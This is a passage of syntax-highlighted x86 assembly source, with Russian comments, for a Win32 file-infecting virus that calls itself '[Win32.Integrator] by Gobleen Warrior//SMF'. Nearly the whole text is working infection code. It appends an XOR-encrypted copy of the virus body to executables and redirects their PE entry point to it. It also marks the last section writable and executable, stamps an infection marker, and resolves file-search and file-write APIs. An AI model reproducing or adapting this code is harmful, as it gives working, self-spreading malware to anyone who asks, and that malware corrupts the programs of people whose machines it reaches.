                        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">pe_entry_point_rva</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; PE.EntryPoint RVA</span><span class="sc0">
                        </span><span class="sc6">neg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">original_ip</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc1">; Запишем в заголовок новую точку входа</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">sec_rva</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; RVA последней секции</span><span class="sc0">
                                               </span><span class="sc1">; в памяти</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">sec_physical_size</span><span class="sc4">]</span><span class="sc0">
                                           </span><span class="sc1">; Физический размер последней</span><span class="sc0">
                                           </span><span class="sc1">; секции</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">pe_entry_point_rva</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                                             </span><span class="sc1">; PE.EntryPoint RVA</span><span class="sc0">
</span><span class="sc1">; Установим указатель на конец файла</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">our_place</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">set_pointer</span><span class="sc0">
</span><span class="sc1">; Сменим ключ для шифровки</span><span class="sc0">
</span><span class="sc5">another</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ourGetTickCount</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; а-ля генератор</span><span class="sc0">
                                                   </span><span class="sc1">; случайных чисел :)))</span><span class="sc0">
                        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc0">
                        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">key</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0"> </span><span class="sc1">; нельзя чтоб ключ был нулем</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">another</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc0"> </span><span class="sc1">; и 020h (Текстовые строки будут</span><span class="sc0">
                                     </span><span class="sc1">; читабельны, но в другом регистре)</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">another</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">key</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
</span><span class="sc1">; Запишем нешифрованную часть вируса в файл</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">cryptstart</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">virstart</span><span class="sc0">
                        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">virstart</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">write_file</span><span class="sc0">
</span><span class="sc1">; зашифруем тело</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">key</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">cryptstart</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">cryptbuf</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">cryptlen</span><span class="sc0">
</span><span class="sc5">cryptor</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
                        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                        </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">cryptor</span><span class="sc0">
</span><span class="sc1">; Запишем шифрованную часть вируса в файл</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">cryptlen</span><span class="sc0">
                        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">cryptbuf</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">write_file</span><span class="sc0">
</span><span class="sc1">; Вычислим длинну звиря, выравненую на ObjectAlign</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">virlen</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">pe_object_align</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                        </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc1">; Модифицируем PE header и Header секции</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">pe_image_size</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">pe_size_of_code</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">sec_virtual_size</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc1">; Вычислим длинну звиря, выравненную на FileAlign</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">virlen</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">pe_file_align</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                        </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc1">; Модифицируем заголовок последней секции</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">sec_physical_size</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                                      </span><span class="sc1">; Физический размер последней секции</span><span class="sc0">
</span><span class="sc1">; Поставим последней секции атрибут read/write/execute/init_data</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">sec_obj_flags</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0e0000040h</span><span class="sc0">
</span><span class="sc1">; Поставим метку зараженности</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">pe_user_minor</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'WG'</span><span class="sc0">
</span><span class="sc1">; Установим указатель на начало PE заголовка</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">mz_pe_pointer</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">set_pointer</span><span class="sc0">
</span><span class="sc1">; Запишем модифицированный PE заголовок</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0f8h</span><span class="sc0">
                        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">pe_header</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">write_file</span><span class="sc0">
</span><span class="sc1">; Установим указатель на начало заголовка последней секции</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">last_sec</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">set_pointer</span><span class="sc0">
</span><span class="sc1">; Запишем модифицированный заголовок последней секции</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">028h</span><span class="sc0">
                        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">sec_header</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">write_file</span><span class="sc0">
</span><span class="sc1">; Закроем файл</span><span class="sc0">
</span><span class="sc1">; Вызов CloseHandle:</span><span class="sc0">
</span><span class="sc1">;               push &lt;хендл файла&gt;</span><span class="sc0">
</span><span class="sc1">;               call CloseHandle</span><span class="sc0">
</span><span class="sc5">close_file</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ourCloseHandle</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">it_not_exe</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">do_file</span><span class="sc0">                 </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">read_file</span><span class="sc0">               </span><span class="sc9">proc</span><span class="sc0">
</span><span class="sc1">; ESI = Скоко читать</span><span class="sc0">
</span><span class="sc1">; EDI = Адрес буффера для считки</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Вызов ReadFile:</span><span class="sc0">
</span><span class="sc1">;               push 0</span><span class="sc0">
</span><span class="sc1">;               push offset &lt;буфер для количества считанных байт&gt;</span><span class="sc0">
</span><span class="sc1">;               push &lt;скока читать&gt;</span><span class="sc0">
</span><span class="sc1">;               push offset &lt;буффер куда считывать&gt;</span><span class="sc0">
</span><span class="sc1">;               push &lt;хендл открытого файла&gt;</span><span class="sc0">
</span><span class="sc1">;               call ReadFile</span><span class="sc0">
                        </span><span class="sc6">pusha</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">bytesread</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ourReadFile</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">popa</span><span class="sc0">
                        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">set_pointer</span><span class="sc0">             </span><span class="sc9">proc</span><span class="sc0">
</span><span class="sc1">; ESI = Куда установить</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Вызов SetFilePointer:</span><span class="sc0">
</span><span class="sc1">;               push &lt;откуда отсчет&gt; ; FILE_BEGIN = 0</span><span class="sc0">
</span><span class="sc1">;               push 0</span><span class="sc0">
</span><span class="sc1">;               push &lt;позиция куда установить&gt;</span><span class="sc0">
</span><span class="sc1">;               push &lt;хендл файла&gt;</span><span class="sc0">
</span><span class="sc1">;               call SetFilePointer</span><span class="sc0">
                        </span><span class="sc6">pusha</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ourSetFilePointer</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">popa</span><span class="sc0">
                        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">write_file</span><span class="sc0">              </span><span class="sc9">proc</span><span class="sc0">
</span><span class="sc1">; ESI = Скока писать</span><span class="sc0">
</span><span class="sc1">; EDI = Откуда писать</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Вызов WriteFile:</span><span class="sc0">
</span><span class="sc1">;               push 0</span><span class="sc0">
</span><span class="sc1">;               push offset &lt;буфер для количества записанных байт&gt;</span><span class="sc0">
</span><span class="sc1">;               push &lt;скока писать&gt;</span><span class="sc0">
</span><span class="sc1">;               push offset &lt;буффер откуда списывать&gt;</span><span class="sc0">
</span><span class="sc1">;               push &lt;хендл открытого файла&gt;</span><span class="sc0">
</span><span class="sc1">;               call WriteFile</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">bytesread</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ourWriteFile</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;╔══════════════════════════════════════════════════════════════════════════╗</span><span class="sc0">
</span><span class="sc1">;║ Звиревые данные                                                          ║</span><span class="sc0">
</span><span class="sc1">;╚══════════════════════════════════════════════════════════════════════════╝</span><span class="sc0">
</span><span class="sc5">getFindFirstFileA</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'FindFirstFileA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">getFindNextFileA</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'FindNextFileA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">getFindClose</span><span class="sc0">            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'FindClose'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">getGetCurrentDirectoryA</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'GetCurrentDirectoryA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">getSetCurrentDirectoryA</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'SetCurrentDirectoryA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">getCreateFileA</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'CreateFileA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">getSetFilePointer</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'SetFilePointer'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">getReadFile</span><span class="sc0">             </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'ReadFile'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">getWriteFile</span><span class="sc0">            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'WriteFile'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">getCloseHandle</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'CloseHandle'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">getSetFileAttributesA</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'SetFileAttributesA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">getGetProfileStringA</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'GetProfileStringA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">getWriteProfileStringA</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'WriteProfileStringA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">getlstrcmpi</span><span class="sc0">             </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'lstrcmpi'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">getGetTickCount</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'GetTickCount'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">maska</span><span class="sc0">                   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'*.*'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc9">IF</span><span class="sc0"> </span><span class="sc5">PROCDIR</span><span class="sc0"> </span><span class="sc9">EQ</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">root_dir</span><span class="sc0">                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'.'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc9">ELSE</span><span class="sc0">
</span><span class="sc5">root_dir</span><span class="sc0">                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc13">'\',0
</span><span class="sc9">ENDIF</span><span class="sc0">

</span><span class="sc5">dotdot</span><span class="sc0">                  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'..'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">ini_section</span><span class="sc0">             </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Temp'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">ini_key</span><span class="sc0">                 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Saved'</span><span class="sc0">
</span><span class="sc5">default_string</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">ourname</span><span class="sc0">                 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'[Win32.Integrator] by Gobleen Warrior//SMF'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'People can fly... Everything can happen...'</span><span class="sc0">
</span><span class="sc5">cryptlen</span><span class="sc0">                </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">cryptstart</span><span class="sc0">
</span><span class="sc5">virlen</span><span class="sc0">                  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">virstart</span><span class="sc0">

</span><span class="sc1">; Это срань всякая типа временных данных, переменных и т.д.</span><span class="sc0">
</span><span class="sc5">temp_ip</span><span class="sc0">                 </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">bytesread</span><span class="sc0">               </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">our_place</span><span class="sc0">               </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">last_sec</span><span class="sc0">                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">search_handler</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">current_dir</span><span class="sc0">             </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">get_string_flag</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">start_fuck_flag</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">get_out_flag</span><span class="sc0">            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">saved_string</span><span class="sc0">            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">start_ini_string</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">end_ini_string</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">counter</span><span class="sc0">                 </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">ourGetProcAdress</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ourFindFirstFileA</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ourFindNextFileA</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ourFindClose</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ourGetCurrentDirectoryA</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ourSetCurrentDirectoryA</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ourCreateFileA</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ourSetFilePointer</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ourReadFile</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ourWriteFile</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ourCloseHandle</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ourSetFileAttributesA</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
